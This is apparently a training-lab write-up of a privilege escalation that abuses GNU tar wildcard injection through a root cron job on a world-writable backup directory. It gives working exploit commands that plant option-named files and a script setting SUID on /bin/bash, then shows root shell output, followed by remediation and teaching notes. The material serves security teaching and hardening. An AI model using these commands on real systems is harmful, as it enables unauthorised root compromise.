# Activity 10: Privilege Escalation via Tar Wildcard Cron Job

## Summary

A root-owned cron job periodically archives the contents of `/usr/lib/backup` using a shell-expanded wildcard (`tar -zcf ... *`). The directory itself is world-writable, so any low-privilege account can place specially-named files inside it that are interpreted by `tar` as command-line options rather than filenames, because the shell expands `*` into literal filenames before `tar` ever sees them. This is the classic "tar wildcard injection" technique, and it allows a low-privilege account to execute arbitrary code as root the next time the cron job fires. Demonstrated successfully from the `backupsvc` foothold, resulting in a SUID root `/bin/bash` and a fully privileged shell.

| Item | Value |
|---|---|
| Target | 192.168.144.100 |

| Attacker | Kali VM on the same host-only lab network |

| Resulting account | `root` (uid 0) |

## Vulnerability

Inspecting root's crontab (readable/writable only by root, viewed here after obtaining root via `e-08- suid-nano-privileged-file-write.md`) shows two Puppet-provisioned entries:

```text
# HEADER: This file was autogenerated at 2026-08-22 04:47:12 +0100 by puppet.
# Puppet Name: writable_cron_script
* * * * * /root/.config/cron.sh
# Puppet Name: backup_wildcard
* * * * * cd /usr/lib/backup && tar -zcf /var/spool/backups/backup.tar.gz *
```

This write-up covers the second entry, `backup_wildcard` (the first, `writable_cron_script`, was investigated and found not exploitable; see the Teaching Notes section below).

The `backup_wildcard` job runs every minute as root. It changes into `/usr/lib/backup` and runs:

```bash
tar -zcf /var/spool/backups/backup.tar.gz *
```

The `*` is expanded by the **shell**, not by `tar`, before the `tar` binary is invoked. This means if a file inside `/usr/lib/backup` has a name starting with `--`, the shell will pass that filename to `tar` as a literal argument, and `tar` (GNU tar) will interpret it as a command-line option rather than as a file to archive, because GNU tar accepts long options anywhere on the command line, not only before filenames.

GNU tar supports a checkpoint mechanism intended for progress reporting during long archive operations:

- `--checkpoint=N` makes tar perform a "checkpoint" every N files processed (here, every 1 file).
- `--checkpoint-action=ACTION` defines what happens at each checkpoint. One valid action is `exec=COMMAND`, which runs an arbitrary shell command.

By creating two files with names that are themselves valid tar options, an attacker can smuggle a `--checkpoint-action=exec=...` directive into the automated root-run tar invocation, causing tar to execute an arbitrary attacker-supplied script as root.

The directory permissions confirm this is exploitable, not merely theoretical:

```
drwxrwxrwx 2 root root 4096 Aug 22 04:47 /usr/lib/backup
```

`/usr/lib/backup` is `0777`, so any local account, regardless of privilege level, can write into it (CWE-732, Incorrect Permission Assignment for Critical Resource, combined with CWE-88 style Argument Injection arising from unsanitised shell wildcard expansion in a privileged script).

## Reconnaissance

From the `backupsvc` foothold:

```bash
ls -ld /usr/lib/backup
ls -la /usr/lib/backup/
ls -ld /var/spool/backups
```

```
drwxrwxrwx 2 root root 4096 Aug 22 04:47 /usr/lib/backup
drwxrwxrwx 2 root root 4096 Aug 22 04:48 /var/spool/backups
```

Both the source directory that `tar` archives and the destination directory for the resulting archive are world-writable. Only the source directory's permissions are required for this exploit; the destination being writable too is a separate, secondary misconfiguration worth noting but not needed here.

## Exploitation

All commands run as `backupsvc` from within `/usr/lib/backup`:

```bash
cd /usr/lib/backup
echo -e '#!/bin/bash\nchmod u+s /bin/bash' > shell.sh
chmod +x shell.sh
touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=sh shell.sh"
```

Command-by-command explanation:

1. **`cd /usr/lib/backup`** — moves into the world-writable directory the cron job will `tar`. This is where the payload files must live, since `*` only expands to files in the current directory at the time the cron job runs.

2. **`echo -e '#!/bin/bash\nchmod u+s /bin/bash' > shell.sh`** — writes the actual payload script. `-e` enables interpretation of `\n` as a newline, producing a two-line file:
   ```bash
   #!/bin/bash
   chmod u+s /bin/bash
   ```
   The payload sets the SUID bit on `/bin/bash`. This is a deliberately simple, easily verified payload for demonstrating privilege escalation (any account can subsequently run `bash -p` to obtain an effective root shell) rather than something more disruptive like a reverse shell or direct `/etc/passwd` modification.

3. **`chmod +x shell.sh`** — makes the payload script executable, since it will be invoked directly via `sh shell.sh` by the checkpoint action, and needing execute permission on the file itself is good practice even though `sh` is explicitly invoked here.

4. **`touch -- "--checkpoint=1"`** — creates an empty file literally named `--checkpoint=1`. The `--` before the filename tells `touch` to stop parsing further arguments as its own options, so the leading `--` in the *filename* is treated as a literal character sequence, not interpreted by `touch`. This file's only purpose is to exist with this exact name; its content is irrelevant.

5. **`touch -- "--checkpoint-action=exec=sh shell.sh"`** — creates a second empty file with a name that, when passed to `tar`, is parsed as the option `--checkpoint-action=exec=sh shell.sh`. Again, the filename itself is the payload; the file's content is never read.

When the cron job next fires, the shell expands `*` inside `/usr/lib/backup` into all filenames present, in some filesystem-dependent order, including:

```
shell.sh
--checkpoint=1
--checkpoint-action=exec=sh shell.sh
```

The resulting command actually executed by cron becomes equivalent to:

```bash
tar -zcf /var/spool/backups/backup.tar.gz shell.sh --checkpoint=1 --checkpoint-action=exec=sh shell.sh
```

`tar` parses `--checkpoint=1` and `--checkpoint-action=exec=sh shell.sh` as genuine options (this is exactly why GNU tar's flexible option parsing makes this attack possible), configuring it to run `sh shell.sh` after every 1 file archived. Since `shell.sh` itself is also being archived (it's a real file in the directory), tar reaches a checkpoint almost immediately and executes the action, running our payload script with root's privileges because the whole cron job runs as root.

## Evidence

Waited for the next cron tick (up to 60 seconds), then checked:

```
backupsvc@cav-csf-linux:/usr/lib/backup$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1265648 Mar 29  2024 /bin/bash
```

The SUID bit (`s` in the owner execute position) confirms root's cron executed the payload.

```
backupsvc@cav-csf-linux:/usr/lib/backup$ /bin/bash -p
bash-5.2# whoami
root
bash-5.2# id
uid=1001(backupsvc) gid=1001(backupsvc) euid=0(root) groups=1001(backupsvc)
```

`bash -p` (the `-p` flag) launches bash without dropping the elevated effective UID that ordinary bash startup discards for safety when real and effective UIDs differ; this is required to actually make use of the SUID bit, since a plain `bash` invocation would otherwise silently drop back to the real UID. The `id` output confirms `euid=0(root)` while the real uid remains `backupsvc`, i.e. full effective root access from the SUID binary.

## Outcome

Full root compromise from the `backupsvc` low-privilege foothold, via a genuinely provisioned and independently exploitable misconfiguration distinct from the `writable_cron_script` entry (which was found non-exploitable due to `/root` directory permissions; see Teaching Notes). This provides a second, cleaner root-escalation chain starting from the NFS-derived `backupsvc` foothold, alongside the existing `distccd`/`druid` → shadow → analyst → SUID nano chain.

## Remediation

- Never construct privileged shell commands that rely on unquoted wildcard expansion (`*`) over a directory that is writable by lower-privileged users; this is a well-known GNU tar/argument-injection pattern and applies to any command whose behaviour can be altered by attacker-controlled filenames (e.g. `rm`, `chown`, `chmod` are similarly affected by wildcard injection, albeit with different exploitation primitives).
- Restrict `/usr/lib/backup` to `root:root 0700` (or a dedicated backup group with no other write access); there is no legitimate reason for arbitrary local users to write into a directory that feeds a privileged backup job.
- If wildcard expansion over an untrusted directory is unavoidable, prefix the command with `--` to terminate option parsing (e.g. `tar -zcf archive.tar.gz -- *`), which prevents GNU tar from interpreting any expanded filename as an option regardless of its leading characters.
- Apply the same `0700`/trusted-group-only permission model to `/var/spool/backups`, the archive output directory, which was also found world-writable during this validation and represents an independent (though not separately exploited) information-disclosure/tampering risk for the backup archives themselves.

## Teaching Notes

This activity is best taught alongside `writable_cron_script`, since both were investigated from the same `backupsvc` foothold and both are Puppet-provisioned entries in the same crontab, but only one is actually exploitable:

- **`writable_cron_script`** (`/root/.config/cron.sh`, mode `0777`): despite the file itself being world-writable, `/root` is `0700`, so no non-root account can traverse into the directory to reach the file at all. This is a valuable negative-finding lesson: a dangerously permissive file mode can be completely neutralised by a correctly restrictive parent directory, and file permissions must always be evaluated together with the full directory path, not in isolation.
- **`backup_wildcard`** (this activity): the containing directory itself (`/usr/lib/backup`) is world-writable, which is what actually matters for this class of attack, so the wildcard injection succeeds.

Comparing the two side by side is a strong exercise in distinguishing genuinely exploitable misconfigurations from superficially similar but practically inert ones, and in understanding exactly which permission (file vs. directory) governs exploitability in each case.
